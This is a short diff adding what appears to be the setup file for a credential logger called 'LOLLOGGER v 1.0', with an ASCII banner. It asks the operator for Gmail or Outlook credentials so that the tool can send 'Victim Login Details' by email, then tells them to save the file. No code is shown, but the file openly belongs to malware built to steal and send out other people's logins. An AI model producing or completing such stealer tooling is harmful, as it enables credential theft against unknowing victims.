@@ -1,0 +1,18 @@
+  _     ___  _     _     ___   ____  ____ _____ ____  
+ | |   / _ \| |   | |   / _ \ / ___|/ ___| ____|  _ \ 
+ | |  | | | | |   | |  | | | | |  _| |  _|  _| | |_) |
+ | |__| |_| | |___| |__| |_| | |_| | |_| | |___|  _ < 
+ |_____\___/|_____|_____\___/ \____|\____|_____|_| \_\
+                      
+                        v 1.0
+                                                      
+Lets Get started...
+
+Gmail or Outlook Credentials (To Send Victim Login Details)
+
+Email: 
+Password: 
+
+Make sure to go to File at the top left and press Save.
+
+
